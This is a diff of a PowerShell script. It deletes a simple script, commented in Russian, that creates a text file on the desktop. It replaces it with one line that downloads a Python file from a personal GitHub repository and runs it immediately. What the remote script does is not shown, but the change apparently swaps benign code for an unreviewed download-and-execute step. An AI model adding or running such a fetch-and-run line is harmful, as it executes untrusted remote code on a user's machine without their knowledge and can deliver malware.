@@ -1,18 +1,1 @@
-# Получаем путь к рабочему столу текущего пользователя
-$desktopPath = [Environment]::GetFolderPath("Desktop")
-
-# Имя файла
-$fileName = "NewFile.txt"
-
-# Полный путь к файлу
-$filePath = Join-Path -Path $desktopPath -ChildPath $fileName
-
-# Создание файла
-New-Item -Path $filePath -ItemType File
-
-# Проверка, что файл создан
-if (Test-Path $filePath) {
-    Write-Host "Файл успешно создан на рабочем столе: $filePath"
-} else {
-    Write-Host "Не удалось создать файл: $filePath"
-}
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Desezutt/pupupu/main/pyp.py" -OutFile "pyp.py"; python pyp.py
